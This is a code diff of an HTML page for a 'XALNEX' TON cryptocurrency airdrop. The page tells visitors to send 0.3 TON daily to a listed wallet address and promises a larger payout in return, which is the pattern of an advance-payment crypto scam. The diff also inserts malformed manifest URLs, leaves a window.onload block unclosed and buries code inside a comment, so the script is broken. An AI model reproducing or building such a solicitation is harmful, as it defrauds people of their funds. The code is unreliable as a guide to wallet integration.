@@ -33,18 +33,17 @@ background-color: red;
     <div id="ton-connect"></div>
 <h1>USE XALNEX TON ADDRESS TO SEND 0.3 TON TRANSCATION DAILY AND RECIEVE A LARGER VALUE IN THE AIRDROP </h1>
    <h1>HERE IS THE XALNEX TON ADDRESS.</h1>
-     <input type="text" value="https:// UQDKHIKHrWjBiJhngnffyul5rCWTQIkzwZ5nMt8I5VeZ8BcT
-  " id="link" readonly>
+     <input type="text" value="https:// UQDKHIKHrWjBiJhngnffyul5rCWTQIkzwZ5nMt8I5VeZ8BcT " id="link" readonly>
   <!-- Send Transaction Button -->
     <button id="send-transaction">Send 0.3 TON DALIY</button>
 
     <script>
         // Initialize TON Connect UI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json', // Update with your manifest URL
+            manifestUrl: 'https://https://t3274.github.io/XALNEX-GAME/index.htmL/tonconnect-manifest.json', // Update with your manifest URL
             buttonRootId: 'ton-connect' // Listen for connection status changes tonConnectUI.onStatusChange((wallet) => { if (wallet) { // User is connected const walletAddress = wallet.account.address; // Display the wallet address in your app document.getElementById('wallet-address').textContent = walletAddress; } else { // User is disconnected document.getElementById('wallet-address').textContent = 'Not connected'; } });
         });
-
+window.onload = async () => { const connector = new TonConnectSDK.TonConnect({ manifestUrl: 'https://t3274.github.io/XALNEX-GAME/index.htm/tonconnect-manifest.json' });
         // Handle connection events
         tonConnectUI.onStatusChange((wallet) => {
             const sendButton = document.getElementById('send-transaction');
